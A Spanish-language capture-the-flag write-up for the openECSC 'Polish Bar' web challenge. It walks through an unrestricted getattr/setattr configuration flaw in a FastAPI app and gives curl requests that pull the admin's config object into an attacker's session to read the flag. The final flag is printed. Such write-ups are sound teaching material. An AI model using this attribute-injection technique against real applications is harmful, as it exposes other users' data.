# Polish Bar Challenge

**Categoría:** Web  
**Dificultad:** Media   

## Descripción

Una aplicación web que simula un bar polaco donde los usuarios pueden gestionar sus bebidas preferidas y su estante de alcohol. La aplicación usa FastAPI con autenticación basada en sesiones y un sistema de configuración personalizado.

## Análisis Inicial

Al acceder a la aplicación, encontramos:
- Un sistema de registro en `/register`
- Una página de perfil en `/profile` que muestra las preferencias del usuario
- Tres endpoints principales:
  - `/config` - Actualiza propiedades de configuración
  - `/beverage` - Agrega bebidas al estante
  - `/empty` - Vacía el estante de alcohol

La estructura de la aplicación revela:
```
app.py          # Aplicación FastAPI
config.py       # Clases de configuración
templates/      # Plantillas HTML
```

## Descubrimiento de la Vulnerabilidad

Examinando el HTML de la página de perfil, encontramos una vulnerabilidad crítica en el formulario de actualización de bebidas:

```html
<form action="/config" method="post">
    <input type="hidden" name="config" value="preferred_beverage">
    <input type="text" name="value" placeholder="e.g., Żubrówka, Vodka, Mead...">
    <button type="submit">Update Beverage</button>
</form>
```

El campo `config` está oculto pero es **completamente modificable** mediante las DevTools del navegador o interceptando la petición. Esto nos permite manipular CUALQUIER propiedad de configuración, no solo `preferred_beverage`.

### Analizando el Backend

Revisando `app.py`, descubrimos la inicialización de la sesión del admin:

```python
def admin_session_setup():
    session_id = str(uuid.uuid4())
    sessions[session_id] = {
        'username': 'admin',
        'password': str(os.urandom(10).hex()),
        'config': BeverageConfig(os.getenv('FLAG', 'openECSC{TEST_FLAG}'))
    }
```

El `preferred_beverage` del admin está configurado con la FLAG

En `config.py`, el flujo de código crítico es:

```python
class PreferenceConfig(AlcoholShelf):
    _all_instances = []  # VARIABLE DE CLASE - compartida entre TODAS las instancias!
    
    def __init__(self, preferred_beverage: str):
        super().__init__()
        self.preferred_beverage = preferred_beverage
        self.alcohol_shelf = AlcoholShelf()
        BeverageConfig._all_instances.append(self)  # ¡El Admin es el primero!

class BeverageConfig(PreferenceConfig):
    def get_property(self, val):
        try:
            if hasattr(self.alcohol_shelf, val):
                return getattr(self.alcohol_shelf, val)
            return getattr(self, val)  # ¡Puede acceder a CUALQUIER atributo!
        except:
            return
    
    def update_property(self, key: str, val: str):
        attr = self.get_property(val)  # Obtiene el valor de 'val'
        if attr:
            setattr(self, key, attr)   # Asigna ese valor a 'key'
            return
        return { 'error': 'property doesn\'t exist!' }
```

**La cadena de vulnerabilidades:**
1. `update_property()` no valida qué propiedades pueden ser modificadas
2. `get_property()` puede acceder a atributos de clase como `_all_instances`
3. `_all_instances` contiene TODAS las configuraciones de usuarios, incluyendo la del admin (primer elemento)
4. La configuración del admin tiene `preferred_beverage = FLAG`

## Explotación

### Paso 1: Registrar un Usuario Normal

```bash
curl -X POST http://localhost/register \
  -d "username=hacker&password=test123" \
  -c cookies.txt
```

O mediante la interfaz web en `http://localhost/register`.

### Paso 2: Agregar `_all_instances` al Shelf

Necesitamos hacer que `_all_instances` sea accesible vía `get_property()`. Podemos hacer esto agregándolo como string al estante de alcohol:

```bash
curl -X POST http://localhost/beverage \
  -d "beverage=_all_instances" \
  -b cookies.txt
```

Ahora `alcohol_shelf` contiene el string `"_all_instances"`, lo que lo hace accesible mediante las verificaciones de `hasattr()`.

### Paso 3: Reemplazar `alcohol_shelf` con `_all_instances`

Usamos la vulnerabilidad para setear nuestro `alcohol_shelf` a la lista global `_all_instances`:

```bash
curl -X POST http://localhost/config \
  -d "config=alcohol_shelf&value=_all_instances" \
  -b cookies.txt
```

```python
# En update_property():
attr = self.get_property("_all_instances")  # Retorna la lista de TODAS las configs
setattr(self, "alcohol_shelf", attr)        # Nuestro shelf ahora es [admin, user1, user2, ...]
```

### Paso 4: Ejecutar `empty_alcohol_shelf()`

Llamamos al endpoint `/empty` para ejecutar la lógica de vaciado del estante:

```bash
curl -X POST http://localhost/empty -b cookies.txt
```

```python
def empty_alcohol_shelf(self):
    if hasattr(self.alcohol_shelf, "_alcohol_shelf"):
        self.alcohol_shelf._alcohol_shelf = [self.alcohol_shelf._alcohol_shelf[0]]
    else:
        self.alcohol_shelf = self.alcohol_shelf[0]  # ¡Toma el primer elemento!
```

Como nuestro `alcohol_shelf` ahora es la lista `_all_instances` (no un objeto `AlcoholShelf`), toma la rama **else** y asigna `self.alcohol_shelf = _all_instances[0]`, que es el **objeto BeverageConfig del admin**

### Paso 5: Ver el Perfil

Accedemos a `/profile` y la flag se muestra:

```bash
curl http://localhost/profile -b cookies.txt
```

La página muestra:
```html
<div class="preferred-beverage">
    openECSC{TEST_FLAG}
</div>
```

## Flag

```
openECSC{gggrrrrrrr_ppyytthhonnn_ace6020c2f56}
```
